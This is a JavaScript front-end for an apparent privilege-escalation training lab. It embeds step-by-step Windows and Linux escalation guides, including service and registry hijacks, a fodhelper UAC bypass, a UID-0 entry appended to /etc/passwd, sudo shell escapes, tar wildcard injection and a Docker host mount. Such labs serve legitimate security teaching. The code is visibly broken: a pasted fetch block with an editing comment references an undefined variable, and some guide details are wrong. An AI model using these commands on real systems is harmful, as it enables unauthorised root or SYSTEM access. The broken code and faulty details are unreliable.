// Detailed guides for all 24 labs (12 Windows, 12 Linux)
const LAB_GUIDES = {
    // ==========================================
    // WINDOWS LABS (1 - 12)
    // ==========================================
    1: `
        <h3>Module 1: Unquoted Service Paths</h3>
        <p><strong>Vulnerability:</strong> A service path containing spaces and lacking quotation marks. Windows parses directory spaces sequentially to find executable files.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Inspect the configuration of the service using <code>sc qc</code>:</p>
        <div class="code-container"><pre>sc qc VulnService</pre></div>
        <p>Verify folder permissions along the path using <code>icacls</code>:</p>
        <div class="code-container"><pre>icacls "C:\\Program Files"</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Create a hijacking payload named <code>Vulnerable.exe</code> in the writable directory (<code>C:\\Program Files</code>):</p>
        <div class="code-container"><pre>echo exploit > "C:\\Program Files\\Vulnerable.exe"</pre></div>
        <p>Start the service to execute the hijack:</p>
        <div class="code-container"><pre>sc start VulnService</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    2: `
        <h3>Module 2: Weak Service Permissions</h3>
        <p><strong>Vulnerability:</strong> Users can modify the service configuration binary path (<code>binPath</code>) to run arbitrary system commands as LocalSystem.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Examine configuration of <code>WeakService</code>:</p>
        <div class="code-container"><pre>sc qc WeakService</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Reconfigure the binary path of the service to add your user to the local Administrators group:</p>
        <div class="code-container"><pre>sc config WeakService binPath= "net localgroup Administrators labuser /add"</pre></div>
        <p>Trigger the execution by starting the service:</p>
        <div class="code-container"><pre>sc start WeakService</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <p>Query administrators to check membership and read the flag:</p>
        <div class="code-container"><pre>net localgroup Administrators
type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    3: `
        <h3>Module 3: AlwaysInstallElevated</h3>
        <p><strong>Vulnerability:</strong> The group policies <code>AlwaysInstallElevated</code> are enabled in the registry, allowing installers (<code>.msi</code>) to execute with SYSTEM privileges.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Verify HKLM and HKCU registry configuration policies:</p>
        <div class="code-container"><pre>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Execute the installer package stored on your desktop in quiet mode:</p>
        <div class="code-container"><pre>msiexec /quiet /qn /i C:\\Users\\labuser\\Desktop\\exploit.msi</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    4: `
        <h3>Module 4: Token Impersonation (PrintSpoofer)</h3>
        <p><strong>Vulnerability:</strong> Service accounts (IIS, network services) possess <code>SeImpersonatePrivilege</code>, allowing them to hijack authenticated SYSTEM tokens.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Examine active token privileges:</p>
        <div class="code-container"><pre>whoami /priv</pre></div>
        <p>Confirm that <code>SeImpersonatePrivilege</code> is listed as <code>Enabled</code>.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Run the PrintSpoofer executable to impersonate SYSTEM and drop into an elevated prompt:</p>
        <div class="code-container"><pre>PrintSpoofer.exe -i -c cmd</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    5: `
        <h3>Module 5: Insecure Registry Autorun</h3>
        <p><strong>Vulnerability:</strong> An administrator startup program loaded from registry keys is hosted inside a writable directory, enabling overwrite hijacks.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check registry run keys for startup executables:</p>
        <div class="code-container"><pre>reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</pre></div>
        <p>Verify permissions of the application directory (e.g. <code>C:\\Program Files\\Security Agent</code>) using <code>icacls</code>.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Overwrite the startup agent executable:</p>
        <div class="code-container"><pre>echo hijack > "C:\\Program Files\\Security Agent\\agent.exe"</pre></div>
        <p>Execute the agent or wait for the simulated administrator login to trigger the exploit:</p>
        <div class="code-container"><pre>agent.exe</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    6: `
        <h3>Module 6: Weak Service Executable ACLs</h3>
        <p><strong>Vulnerability:</strong> The binary file of a service running as SYSTEM is directly writable by unprivileged users, bypassing configuration locks.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check the service executable path:</p>
        <div class="code-container"><pre>sc qc WeakACLService</pre></div>
        <p>Examine the ACLs on the target service binary:</p>
        <div class="code-container"><pre>icacls "C:\\Program Files\\WeakACL\\service.exe"</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Overwrite the service executable directly with a payload:</p>
        <div class="code-container"><pre>echo payload > "C:\\Program Files\\WeakACL\\service.exe"</pre></div>
        <p>Restart the service to execute: </p>
        <div class="code-container"><pre>sc start WeakACLService</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    7: `
        <h3>Module 7: DLL Hijacking</h3>
        <p><strong>Vulnerability:</strong> Applications often load dependencies from relative directories. Overwriting these missing DLLs executes malicious code.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Examine search paths. The administrative utility <code>app.exe</code> tries to load a library named <code>tpsapi.dll</code> relative to User Documents.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Place a dynamic-link library payload named <code>tpsapi.dll</code> into your Documents folder:</p>
        <div class="code-container"><pre>echo payload > C:\\Users\\labuser\\Documents\\tpsapi.dll</pre></div>
        <p>Run the application to trigger execution:</p>
        <div class="code-container"><pre>C:\\"Program Files"\\App\\app.exe</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    8: `
        <h3>Module 8: PATH Environment Hijacking</h3>
        <p><strong>Vulnerability:</strong> Writable user folders listed early in the system PATH variable hijack standard system binary execution.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check directories in the search path. In this environment, a system batch script <code>run_script.bat</code> executes <code>netstat -ano</code> without absolute references.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Place a custom payload named <code>netstat.exe</code> inside your writable Local Temp directory (which precedes System32 in PATH):</p>
        <div class="code-container"><pre>echo exploit > C:\\Users\\labuser\\AppData\\Local\\Temp\\netstat.exe</pre></div>
        <p>Execute the system batch script to trigger: </p>
        <div class="code-container"><pre>run_script.bat</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    9: `
        <h3>Module 9: Service Registry Overwrite</h3>
        <p><strong>Vulnerability:</strong> Users possess permissions to edit service parameters in HKLM registry, enabling them to change the service execution path.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check registry key permissions of the service <code>RegService</code>:</p>
        <div class="code-container"><pre>reg query HKLM\\System\\CurrentControlSet\\Services\\RegService</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Overwrite the <code>ImagePath</code> registry parameter to execute an privilege command:</p>
        <div class="code-container"><pre>reg add HKLM\\System\\CurrentControlSet\\Services\\RegService /v ImagePath /t REG_EXPAND_SZ /d "net localgroup Administrators labuser /add" /f</pre></div>
        <p>Trigger the execution by starting the service:</p>
        <div class="code-container"><pre>sc start RegService</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    10: `
        <h3>Module 10: Modifiable Startup Shortcut</h3>
        <p><strong>Vulnerability:</strong> Shortcut files inside the Windows Startup folder are writable, running payloads when any user logs in.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Inspect permissions of the Startup folder:</p>
        <div class="code-container"><pre>icacls "C:\\Users\\labuser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Create or overwrite a batch command file in the Startup folder. For this lab, create 'run.bat' which will execute on simulated admin login:</p>
        <div class="code-container"><pre>echo exploit > "C:\\Users\\labuser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat"</pre></div>
        <p>Trigger execution by running the autorun checker:</p>
        <div class="code-container"><pre>agent.exe</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    11: `
        <h3>Module 11: UAC Bypass (Fodhelper)</h3>
        <p><strong>Vulnerability:</strong> High integrity administrative utilities (e.g. 'fodhelper.exe') load default associations from HKCU classes registry keys without verification.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check if your current user is in local administrators group (but filtered by UAC):</p>
        <div class="code-container"><pre>net localgroup Administrators</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Create a registry structure hijack under 'ms-settings' and point the default key value to shell hijack payload:</p>
        <div class="code-container"><pre>reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "net localgroup Administrators labuser /add" /f</pre></div>
        <p>Launch the auto-elevating executable 'fodhelper' to run the payload with high integrity:</p>
        <div class="code-container"><pre>fodhelper.exe</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,
    12: `
        <h3>Module 12: Saved Credentials (cmdkey)</h3>
        <p><strong>Vulnerability:</strong> Windows allows users to store credentials in local storage vaults. These can be run using runas tools.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Query stored credentials listings on the host:</p>
        <div class="code-container"><pre>cmdkey /list</pre></div>
        <p>Identify active target administrator credentials.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Run administrative commands utilizing the stored vault credentials with the '/savecred' flag:</p>
        <div class="code-container"><pre>runas /user:Administrator /savecred "cmd.exe"</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>type C:\\Users\\Administrator\\Desktop\\flag.txt</pre></div>
    `,

    // ==========================================
    // LINUX LABS (13 - 24)
    // ==========================================
    13: `
        <h3>Module 13: SUID PATH Hijacking</h3>
        <p><strong>Vulnerability:</strong> An SUID binary (running as root) executes system utilities relatively (e.g., calling 'service' instead of '/usr/sbin/service'), allowing PATH manipulation attacks.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Locate the SUID binaries on the system and inspect their strings:</p>
        <div class="code-container"><pre>ls -l /usr/local/bin/system_status</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Create a malicious script named 'service' in a writable directory, e.g., '/tmp':</p>
        <div class="code-container"><pre>echo "/bin/sh" > /tmp/service
chmod +x /tmp/service</pre></div>
        <p>Prepend '/tmp' to your system PATH variable and run the SUID executable:</p>
        <div class="code-container"><pre>export PATH=/tmp:$PATH
/usr/local/bin/system_status</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    14: `
        <h3>Module 14: SUID Shared Object Injection</h3>
        <p><strong>Vulnerability:</strong> An SUID application attempts to load shared objects ('.so') from writable user directories, letting users hijack execution.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Trace libraries loaded by the SUID binary '/usr/local/bin/calc'. Notice it searches inside '/home/student/libs/'.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Write an exploit payload shared library inside the searched directory:</p>
        <div class="code-container"><pre>echo "payload" > /home/student/libs/libcalc.so</pre></div>
        <p>Execute the SUID program to load the hijacked library and spawn a root prompt:</p>
        <div class="code-container"><pre>/usr/local/bin/calc</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    15: `
        <h3>Module 15: Writable /etc/passwd</h3>
        <p><strong>Vulnerability:</strong> Writable system user records file '/etc/passwd' allows editing root-equivalent user definitions.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check the permissions of the '/etc/passwd' file:</p>
        <div class="code-container"><pre>ls -l /etc/passwd</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Append a new user account containing UID 0 (root privileges) to the password file. Password hash below represents 'password':</p>
        <div class="code-container"><pre>echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd</pre></div>
        <p>Authenticate as the newly created root-equivalent user:</p>
        <div class="code-container"><pre>su hacker</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    16: `
        <h3>Module 16: Sudo Rights (find)</h3>
        <p><strong>Vulnerability:</strong> The current user possesses sudo rights to run '/usr/bin/find' as root without a password, enabling shell escape commands.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check the permitted sudo rules for the active user session:</p>
        <div class="code-container"><pre>sudo -l</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Execute a shell breakout payload utilizing the find command interface:</p>
        <div class="code-container"><pre>sudo find . -exec /bin/sh -p \\; -quit</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    17: `
        <h3>Module 17: Sudo Rights (less/vi)</h3>
        <p><strong>Vulnerability:</strong> Sudo rights granted on interactive editors/pagers allow users to escape from text rendering modes into shell shells.</p>
        <h4>Step 1: Enumeration</h4>
        <p>List commands executable with sudo privileges:</p>
        <div class="code-container"><pre>sudo -l</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Execute the editor with sudo privileges:</p>
        <div class="code-container"><pre>sudo less /etc/passwd</pre></div>
        <p>Once inside the pager view, type the shell escape command and press Enter:</p>
        <div class="code-container"><pre>!/bin/sh</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    18: `
        <h3>Module 18: Writable Cron Job Script</h3>
        <p><strong>Vulnerability:</strong> A root cron job executes scripts located inside directories writable by unprivileged accounts.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Inspect system-scheduled crontabs:</p>
        <div class="code-container"><pre>cat /etc/cron.d/backup</pre></div>
        <p>Verify write permissions of the script target '/usr/local/bin/backup.sh'.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Overwrite the cron script to execute commands as root (e.g. copying flag to accessible temp directory):</p>
        <div class="code-container"><pre>echo "cat /root/flag.txt > /tmp/flag" >> /usr/local/bin/backup.sh</pre></div>
        <p>Wait/simulate cron loop execution, check output, or log in as root:</p>
        <div class="code-container"><pre>cat /tmp/flag</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    19: `
        <h3>Module 19: Cron Wildcard Tar Injection</h3>
        <p><strong>Vulnerability:</strong> Cron backups executing 'tar' with a wildcard '*' parameter inside writable folders are susceptible to argument injection.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Query scheduled backups configurations:</p>
        <div class="code-container"><pre>cat /etc/cron.d/compress</pre></div>
        <p>Notice the command runs 'tar -cf backup.tar *' inside '/var/www/html'.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Create filenames that match tar parameter options to trigger command execution on expand:</p>
        <div class="code-container"><pre>echo "cat /root/flag.txt > /tmp/flag" > /var/www/html/exploit.sh
echo "" > "/var/www/html/--checkpoint=1"
echo "" > "/var/www/html/--checkpoint-action=exec=sh exploit.sh"</pre></div>
        <p>Trigger the tar execution parser wildcard shell: </p>
        <div class="code-container"><pre>tar -cf backup.tar *</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    20: `
        <h3>Module 20: Readable /etc/shadow</h3>
        <p><strong>Vulnerability:</strong> Read access allowed on the password shadow database '/etc/shadow' enables extraction and cracking of administrative password hashes.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Check file read permissions of shadow file:</p>
        <div class="code-container"><pre>cat /etc/shadow</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Extract the root password hash starting with '$6$'. Assume we cracked it offline to reveal password 'rootpassword'. Authenticate as root:</p>
        <div class="code-container"><pre>su root</pre></div>
        <p>Enter the password when prompted (e.g. 'rootpassword'):</p>
        <div class="code-container"><pre>su root rootpassword</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    21: `
        <h3>Module 21: Linux Capabilities (Python)</h3>
        <p><strong>Vulnerability:</strong> Binary capabilities permit elevated permissions (e.g., setting UIDs) without needing suid set on executable files.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Locate files with active system capabilities:</p>
        <div class="code-container"><pre>getcap -r / 2>/dev/null</pre></div>
        <p>Identify that '/usr/bin/python3' has 'cap_setuid+ep' set.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Run Python to modify your UID to 0 (root) and spawn a root bash prompt:</p>
        <div class="code-container"><pre>python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    22: `
        <h3>Module 22: Sudo LD_PRELOAD</h3>
        <p><strong>Vulnerability:</strong> Maintenance of 'LD_PRELOAD' under sudo defaults allows injecting custom libraries and running root constructor instructions.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Review active environment settings using 'sudo -l':</p>
        <div class="code-container"><pre>sudo -l</pre></div>
        <p>Verify that 'env_keep+=LD_PRELOAD' is configured.</p>
        <h4>Step 2: Exploitation</h4>
        <p>Compile/write a shell payload shared library inside '/tmp':</p>
        <div class="code-container"><pre>echo "constructor payload" > /tmp/exploit.so</pre></div>
        <p>Run a permitted sudo script/utility (like apache2) specifying the library payload path:</p>
        <div class="code-container"><pre>sudo LD_PRELOAD=/tmp/exploit.so apache2</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `,
    23: `
        <h3>Module 23: Docker Socket Privilege Escalation</h3>
        <p><strong>Vulnerability:</strong> Membership inside the 'docker' group permits interacting with UNIX socket daemon files to mount target hosts' disks.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Query groups and check '/var/run/docker.sock' file permissions:</p>
        <div class="code-container"><pre>id
ls -l /var/run/docker.sock</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Run a container mounting the entire root drive ('/') onto container path '/mnt':</p>
        <div class="code-container"><pre>docker run -v /:/mnt -it alpine sh</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /mnt/root/flag.txt</pre></div>
    `,
    24: `
        <h3>Module 24: NFS Root Squashing</h3>
        <p><strong>Vulnerability:</strong> Network exports with 'no_root_squash' enabled allow remote root sessions to create root SUID binaries inside network shares.</p>
        <h4>Step 1: Enumeration</h4>
        <p>Review configuration settings of NFS mount points:</p>
        <div class="code-container"><pre>cat /etc/exports</pre></div>
        <h4>Step 2: Exploitation</h4>
        <p>Write an executable file into the share path '/mnt/share' and set SUID execution permissions on it:</p>
        <div class="code-container"><pre>chmod +s /mnt/share/shell</pre></div>
        <h4>Step 3: Collect Flag</h4>
        <div class="code-container"><pre>cat /root/flag.txt</pre></div>
    `
};

document.addEventListener('DOMContentLoaded', () => {
    // Instantiate Terminal
    const term = new Terminal('terminal-input', 'terminal-screen', 'terminal-history', 'terminal-prompt');
    
    let activeScenarioId = 1;
    let activeCategory = 'Windows'; // Windows or Linux
    let completedScenarios = JSON.parse(localStorage.getItem('completed_scenarios') || '[]');
    let scenariosData = []; // Store list fetched from API
    
    // Elements
    const modulesContainer = document.getElementById('modules-container');
    const guideContent = document.getElementById('guide-content');
    const difficultyBadge = document.getElementById('active-difficulty');
    const flagForm = document.getElementById('flag-form');
    const flagInput = document.getElementById('flag-input');
    const flagResult = document.getElementById('flag-result');
    const btnResetSession = document.getElementById('btn-reset-session');
    
    const tabWindows = document.getElementById('tab-windows');
    const tabLinux = document.getElementById('tab-linux');
    
    // Category selection triggers
    if (tabWindows && tabLinux) {
        tabWindows.addEventListener('click', () => {
            if (activeCategory === 'Windows') return;
            activeCategory = 'Windows';
            tabWindows.classList.add('active');
            tabLinux.classList.remove('active');
            renderModulesList();
            // Automatically select first scenario of the selected category
            const first = scenariosData.find(s => s.category === 'Windows');
            if (first) selectScenario(first.id, first.difficulty);
        });
        
        tabLinux.addEventListener('click', () => {
            if (activeCategory === 'Linux') return;
            activeCategory = 'Linux';
            tabLinux.classList.add('active');
            tabWindows.classList.remove('active');
            renderModulesList();
            // Automatically select first scenario of the selected category
            const first = scenariosData.find(s => s.category === 'Linux');
            if (first) selectScenario(first.id, first.difficulty);
        });
    }
    
    // Fetch scenario list from backend
    async function loadScenarios() {
        try {
            const response = await fetch('/api/scenarios');
            scenariosData = await response.json();
            renderModulesList();
            
            // Set initial selection
            const initial = scenariosData.find(s => s.id === activeScenarioId);
            if (initial) {
                selectScenario(initial.id, initial.difficulty);
            }
        } catch (err) {
            modulesContainer.innerHTML = `<div class="text-glow-red">Error loading labs: ${err.message}</div>`;
        }
    }
    
    // Render filtered list of scenarios
    function renderModulesList() {
        modulesContainer.innerHTML = '';
        
        const filtered = scenariosData.filter(s => s.category === activeCategory);
        
        filtered.forEach(s => {
            const isCompleted = completedScenarios.includes(s.id);
            const isActive = s.id === activeScenarioId;
            
            const card = document.createElement('div');
            card.className = `module-card ${isActive ? 'active' : ''} ${isCompleted ? 'completed' : ''}`;
            card.dataset.id = s.id;
            
            card.innerHTML = `
                <div class="module-info">
                    <div class="module-title">${s.name}</div>
                    <div class="module-meta">
                        <span class="badge ${s.difficulty.toLowerCase()}">${s.difficulty}</span>
                    </div>
                </div>
                <div class="module-status">
                    <i class="fa-solid ${isCompleted ? 'fa-circle-check' : 'fa-circle-notch'}"></i>
                </div>
            `;
            
            card.addEventListener('click', () => selectScenario(s.id, s.difficulty));
            modulesContainer.appendChild(card);
        });
    }
    
    async function selectScenario(scenarioId, difficulty) {
        activeScenarioId = scenarioId;
        term.setScenario(scenarioId);
        
        // Update sidebar visual active card
        document.querySelectorAll('.module-card').forEach(card => {
            if (parseInt(card.dataset.id) === scenarioId) {
                card.classList.add('active');
            } else {
                card.classList.remove('active');
            }
        });
        
        // Reset flag messages
        flagResult.className = 'flag-result-box hidden';
        flagInput.value = '';
        
        // Initialize lab backend session
        try {
            term.clearOutput();
            term.writeOutput("[*] Instantiating lab environment...");
            
            // Locate your fetch call and modify the endpoint url string to this:
const response = await fetch('/api/command', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ command: userRawInput })
});
            
            const data = await response.json();
            
            term.clearOutput();
            term.writeOutput(data.welcome);
            term.currentCwd = data.cwd;
            term.currentUsername = data.username;
            term.category = data.category || 'Windows';
            
            // Adjust Shell Toggle buttons depending on active OS
            const shellModes = document.getElementById('terminal-shell-modes');
            const termTitle = document.getElementById('terminal-title-text');
            const targetOsBadge = document.getElementById('target-os-badge');
            
            if (term.category === 'Linux') {
                if (shellModes) shellModes.classList.add('hidden');
                if (termTitle) termTitle.innerHTML = `<i class="fa-solid fa-terminal"></i> Bash - ${term.currentUsername}@rootthebox`;
                if (targetOsBadge) targetOsBadge.innerHTML = `<i class="fa-brands fa-linux"></i> UBUNTU-TARGET-02`;
            } else {
                if (shellModes) shellModes.classList.remove('hidden');
                if (termTitle) termTitle.innerHTML = `<i class="fa-solid fa-terminal"></i> PowerShell - Administrator Mode`;
                if (targetOsBadge) targetOsBadge.innerHTML = `<i class="fa-brands fa-windows"></i> WIN10-TARGET-01`;
            }
            
            term.updatePrompt();
            
            // Update active user badge
            const badge = document.getElementById('active-user-badge');
            if (data.escalated) {
                badge.textContent = term.category === 'Linux' ? 'root' : 'SYSTEM';
                badge.className = 'status-value text-glow-cyan';
            } else {
                badge.textContent = data.username;
                badge.className = 'status-value text-glow-green';
            }
            
        } catch (err) {
            term.writeOutput(`[-] Error launching lab: ${err.message}`, true);
        }
        
        // Update instructions content
        updateGuide(scenarioId, difficulty);
    }
    
    function updateGuide(scenarioId, difficulty) {
        guideContent.innerHTML = LAB_GUIDES[scenarioId] || '<p>No instructions available.</p>';
        difficultyBadge.textContent = difficulty.toUpperCase();
        difficultyBadge.className = `badge ${difficulty.toLowerCase()}`;
    }
    
    // Reset active scenario state
    btnResetSession.addEventListener('click', () => {
        const activeCard = scenariosData.find(s => s.id === activeScenarioId);
        if (activeCard) {
            selectScenario(activeScenarioId, activeCard.difficulty);
        }
    });
    
    // Flag validation submission
    flagForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const flagVal = flagInput.value.trim();
        
        if (!flagVal) return;
        
        try {
            const response = await fetch('/api/submit-flag', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    scenario_id: activeScenarioId,
                    flag: flagVal
                })
            });
            
            const data = await response.json();
            
            flagResult.classList.remove('hidden');
            if (data.success) {
                flagResult.className = 'flag-result-box success';
                flagResult.innerHTML = `<i class="fa-solid fa-square-check"></i> <span>${data.message}</span>`;
                
                // Add to completed in localStorage
                if (!completedScenarios.includes(activeScenarioId)) {
                    completedScenarios.push(activeScenarioId);
                    localStorage.setItem('completed_scenarios', JSON.stringify(completedScenarios));
                }
                
                // Reload list to update checkmark
                renderModulesList();
            } else {
                flagResult.className = 'flag-result-box error';
                flagResult.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> <span>${data.message}</span>`;
            }
            
        } catch (err) {
            flagResult.className = 'flag-result-box error';
            flagResult.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> <span>Error verifying flag: ${err.message}</span>`;
        }
    });
    
    // Initial Load
    loadScenarios();
});
